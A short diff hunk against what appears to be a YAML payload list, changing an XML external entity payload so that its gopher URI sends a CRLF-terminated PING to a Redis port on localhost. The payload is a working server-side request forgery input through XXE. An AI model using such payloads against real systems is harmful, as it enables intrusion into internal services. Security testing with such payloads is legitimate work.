@@ -218,7 +218,7 @@ payloads:
   - |
     <?xml version="1.0"?>
     <!DOCTYPE foo [
-      <!ENTITY xxe SYSTEM "gopher://localhost:6379/_PING">
+      <!ENTITY xxe SYSTEM "gopher://localhost:6379/_PING%0D%0A">
     ]>
     <foo>&xxe;</foo>
 
